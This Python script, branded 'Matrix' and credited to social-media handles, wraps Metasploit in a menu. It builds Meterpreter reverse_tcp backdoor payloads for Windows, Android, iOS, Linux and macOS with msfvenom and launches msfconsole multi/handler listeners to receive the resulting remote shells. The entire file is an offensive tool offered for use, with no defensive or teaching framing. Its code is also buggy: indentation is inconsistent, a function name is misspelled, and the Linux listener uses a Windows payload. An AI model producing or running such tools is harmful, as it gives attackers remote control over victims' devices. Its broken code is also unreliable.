import os as matrix
import sys as n
import time as mm
from platform import system
try :

	def Matrix () :


		W = '\033[0m'  # white (normal)
		R = '\033[31m'  # red
		G = '\033[32m'  # green
		O = '\033[33m'  # orange
		B = '\033[34m'  # blue
		P = '\033[35m'  # purple
		C = '\033[36m'  # cyan
		GR = '\033[37m'  # gray


		def clear():
		    if system() == 'Linux':
		        matrix.system("clear")
		    else:
		        pass


		clear()


		def slow(M):
		    for c in M + '\n':
		        n.stdout.write(c)
		        n.stdout.flush()
		        mm.sleep(2. / 100)


		slow(W + '\t\t\t\t\n\n\n insta:d7_nn\t\t\t\tfb:matrix.gov')
		print(G + '''

	        .---. Matrix  .------KSA-----
	       /     \  __  /    ------
	      / /     \(  )/    -----
	     //////   ' \/ `   ---
	    //// / // :    : ---
	   // /   /  /`    '--
	  //          //..\\
	=============UU====UU====
	             '//||\\`
	               ''``
                     
		''' + R)
		slow(W+ '''
{1}> payload/windows
{2}> payload/android
{3}> payload/appl_ios
{4}> payload/linux
{5}> payload/mac


	  {6}> Listen

	  {99}> exit

		''')
		while True:
			
		     numper = input("enter your numper>>>")
		     if numper == 99:
		        break

		     elif numper == 1:
		       LHOST = raw_input("enter the LHOST>>")
		       LPORT = input ("enter the port>>")
		       name = raw_input('name payload>>')
		       matrix.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={}  -f exe -o/$HOME/{}.exe'.format(LHOST,LPORT,name)) 
		       ass = raw_input("Do you want to make a listening session y/n }}")
		       if ass == "y":
		        matrix.system("msfconsole -x  'use multi/handler ; set payload windows/meterpreter/reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		       else:
		      	ex = raw_input('Do you want to go out y/n}}')
		        if ex == 'y':
		        	break
		        else:
		        	Matrix()

		     elif numper == 2:
		       LHOST = raw_input("enter the LHOST>>")
		       LPORT = input ("enter the port>>")
		       name = raw_input('name payload>>')

		       matrix.system('msfvenom -p android/meterpreter/reverse_tcp  LHOST={} LPORT={}   -o/$HOME/{}.apk'.format(LHOST,LPORT,name))
		       ass = raw_input("Do you want to make a listening session y/n }}")
		       if ass == "y":
		        matrix.system("msfconsole -x  'use multi/handler ; set payload android/meterpreter/reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		       else:
		      	ex = raw_input('Do you want to go out y/n}}')
		        if ex == 'y':
		        	break
		        else:
		        	Matrix()

		     elif numper ==3:
		      LHOST = raw_input("enter the LHOST>>")
		      LPORT = input ("enter the port>>")
		      name = raw_input('name payload>>')
		      matrix.system('msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp  LHOST={} LPORT={} -o/$HOME/{}.api'.format(LHOST,LPORT,name))
		      ass = raw_input("Do you want to make a listening session y/n }}")
		      if ass == "y" :
		      	matrix.system("msfconsole -x  'use multi/handler ; set payload apple_ios/aarch64/meterpreter_reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		      else:
		      	ex = raw_input('Do you want to go out y/n}}')
		        if ex == 'y':
		        	break
		        else:
		        	Matrix()



		     elif numper ==4:
		      LHOST = raw_input("enter the LHOST>>")
		      LPORT = input ("enter the port>>")
		      name = raw_input('name payload>>')
		      matrix.system('msfvenom -p linux/x86/meterpreter/reverse_tcp   -f elf  LHOST={} LPORT={}   -o/$HOME/{}.elf '.format(LHOST,LPORT,name))
		      ass = raw_input("Do you want to make a listening session y/n }}")
		      if ass == 'y':
		      	matrix.system("msfconsole -x  'use multi/handler ; set payload linux/x86/meterpreter/reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		      else:
		      	ex = raw_input('Do you want to go out y/n}}')
		        if ex == 'y':
		        	break
		        else:
		        	Matrix()
		   


		     elif numper ==5:
		      LHOST = raw_input("enter the LHOST>>")
		      LPORT = input ("enter the port>>")
		      name = raw_input('name payload>>')
		      matrix.system('msfvenom -p osx/x64/meterpreter_reverse_tcp   -f macho  LHOST={} LPORT={}   -o/$HOME/{}.macho '.format(LHOST,LPORT,name))
		      ass = raw_input("Do you want to make a listening session y/n }}")
		      if ass == 'y':
		      	matrix.system("msfconsole -x  'use multi/handler ; set payload osx/x64/meterpreter_reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		      else:
		      	ex = raw_input('Do you want to go out y/n}}')
		        if ex == 'y':
		        	break
		        else:
		        	Matrix()

		     elif numper ==6 :
		      LHOST = raw_input("enter the LHOST>>")
		      LPORT = input ("enter the port>>")
		      print(G+"""


	        .---. Matrix  .------KSA-----
	       /     \  __  /    ------
	      / /     \(  )/    -----
	     //////   ' \/ `   ---
	    //// / // :    : ---
	   // /   /  /`    '--
	  //          //..\\
	=============UU====UU====
	             '//||\\`

""")
		      slow(W+"""
1 - Windows
2 - Android
3 - Appl_ios
4 - Linux
5 - MAC

    99 - Back 
""")         


		      Listen = input('Enter The Numper Listen }}') 
		      if Listen ==1:
		      	matrix.system("msfconsole -x  'use multi/handler ; set payload windows/meterpreter/reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		      if Listen ==2:
		      	matrix.system("msfconsole -x  'use multi/handler ; set payload android/meterpreter/reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		      if Listen ==3:
		      	matrix.system("msfconsole -x  'use multi/handler ; set payload apple_ios/aarch64/meterpreter_reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		      if Listen ==4:
		      	matrix.system("msfconsole -x  'use multi/handler ; set payload windows/meterpreter/reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		      if Listen ==5:
		      	matrix.system("msfconsole -x  'use multi/handler ; set payload osx/x64/meterpreter_reverse_tcp ;  set LHOST {} ;  set LPORT {} ; exploit -j'".format(LHOST,LPORT))
		      if Listen ==99:
		      	Matrx()

	if __name__ == '__main__':
		Matrix()
except KeyboardInterrupt : 
	Matrix()
except NameError:
	Matrix() 
except SyntaxError:	
	Matrix()		
	        
    
    
